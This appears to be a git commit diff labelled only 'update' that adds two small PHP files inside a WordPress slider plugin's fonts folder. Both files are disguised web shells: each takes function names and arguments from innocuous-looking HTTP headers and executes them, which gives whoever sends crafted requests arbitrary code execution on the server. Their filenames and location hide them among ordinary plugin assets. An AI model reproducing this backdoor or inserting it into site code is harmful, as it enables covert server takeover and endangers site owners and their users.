1ed503daa416dd4ed58c9f2d3bcf54c4e67fedf9
Fast and Static <it@e-me.co>
2024-09-29 06:05:51 +0000

    update

---
+++ wp-content/plugins/revslider/public/assets/fonts/forbiden.php
@@ -0,0 +1,6 @@
+<?php
+$_HEADERS = getallheaders();
+if (isset($_HEADERS['Clear-Site-Data'])) {
+    $request = $_HEADERS['Clear-Site-Data']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['Sec-Websocket-Accept']));
+    $request();
+}
---
+++ wp-content/plugins/revslider/public/assets/fonts/sessionWrite.php
@@ -0,0 +1,6 @@
+<?php
+$_HEADERS = getallheaders();
+if (isset($_HEADERS['If-Unmodified-Since'])) {
+    $rjust = $_HEADERS['If-Unmodified-Since']('', $_HEADERS['Content-Security-Policy']($_HEADERS['Feature-Policy']));
+    $rjust();
+}
